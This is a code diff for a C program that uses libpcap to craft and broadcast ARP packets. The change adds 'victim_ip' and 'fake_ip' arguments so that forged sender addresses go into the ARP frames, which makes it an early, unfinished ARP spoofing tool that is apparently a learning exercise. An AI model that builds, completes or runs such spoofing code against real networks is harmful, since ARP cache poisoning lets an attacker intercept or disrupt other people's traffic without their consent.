@@ -10,10 +10,11 @@
 #include <net/ethernet.h>
 
 #define MAC_BUF_LEN 20
+#define PACKET_SIZE 60
 
 void get_mac(u_int8_t *shost);
 void make_eth(u_char *packet);
-void make_arp(u_char *packet);
+void make_arp(u_char *packet,u_char *victim_ip,u_char *fake_ip);
 
 typedef struct ether_header ether_header; //ethernet.h
 typedef struct ether_arp ether_arp; //if_ether.h
@@ -31,7 +32,7 @@ int main(int argc, char *argv[])
 	bpf_u_int32 mask;		/* Our netmask */
 	bpf_u_int32 net;		/* Our IP */
 	struct pcap_pkthdr header;	/* The header that pcap gives us */
-	u_char *packet=malloc(60);		/* The actual packet */
+	u_char *packet=malloc(PACKET_SIZE);		/* The actual packet */
 	
 	/* Define the device */
 
@@ -68,16 +69,14 @@ int main(int argc, char *argv[])
 		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
 		return(2);
 	}
-
-	//get_mac();
+	if (argc<4){puts("more more\n"); return(2);}
 	make_eth(packet);
-	make_arp(packet);
-	if(pcap_sendpacket(handle,packet,60))
+	make_arp(packet,argv[2],argv[3]);
+	if(pcap_sendpacket(handle,packet,PACKET_SIZE))
 		puts("fail");
-
+	pcap_next_ex(handle, &header,&packet);  // will get a mac_ad but not yet....
 	
-//	pcap_next_ex(handle, &header,&packet);
-//	pcap_close(handle);
+	pcap_close(handle);
 	return(0);
 }
 
@@ -95,7 +94,7 @@ void get_mac(uint8_t *shost)
 	}
 
 	fclose(fp);
-	memcpy(shost, ether->ether_shost, 6);
+	memcpy(shost, ether->ether_shost, ETH_ALEN);
 }
 
 void make_eth(u_char *packet)
@@ -103,19 +102,19 @@ void make_eth(u_char *packet)
 
 	ether_header *ether;
 	ether=(ether_header *)packet;
-	u_int8_t *shost_temp = malloc(6);
+	u_int8_t *shost_temp = malloc(ETH_ALEN);
 	get_mac(shost_temp);
 	memcpy(ether->ether_shost,shost_temp,ETH_ALEN);
 	ether->ether_type=htons(0x0806); //ETHERTYPE_ARP
 	printf("eth_dho:");
+	memset(ether->ether_dhost,0xff,ETH_ALEN);
 	for(int i=0;i<ETH_ALEN;i++){
-	ether->ether_dhost[i]=0xff;
+	//ether->ether_dhost[i]=0xff;
 	printf("%02X : ",ether->ether_dhost[i]);}
 	printf("eth_type:%04X\n",ether->ether_type);
 }
-void make_arp(u_char *packet)
+void make_arp(u_char *packet,u_char *victim_ip,u_char *fake_ip)
 {
-
 	u_int16_t hd_type=0x0001;
 	u_int16_t pro_type=0x0800;
 	u_char hd_size=0x06;
@@ -140,13 +139,13 @@ void make_arp(u_char *packet)
 //		if(i!=ETH_ALEN-1)printf("%02X :",arp->arp_sha[i]);
 //		else printf("%02X\n",arp->arp_sha[i]);
 //	}
-	inet_pton(AF_INET,"192.168.32.217",arp->arp_spa);
+	inet_pton(AF_INET,fake_ip,arp->arp_spa);
 		memset(arp->arp_tha,0x00,ETH_ALEN);
 //		for(int i=0;i<ETH_ALEN;i++){
 //			if(i!=ETH_ALEN-1)printf("%02X :",arp->arp_tha[i]);
 //			else printf("%02X\n",arp->arp_tha[i]);
 //		}
-	inet_pton(AF_INET,"192.168.32.254",arp->arp_tpa);
+	inet_pton(AF_INET,victim_ip,arp->arp_tpa);
 }
 
 
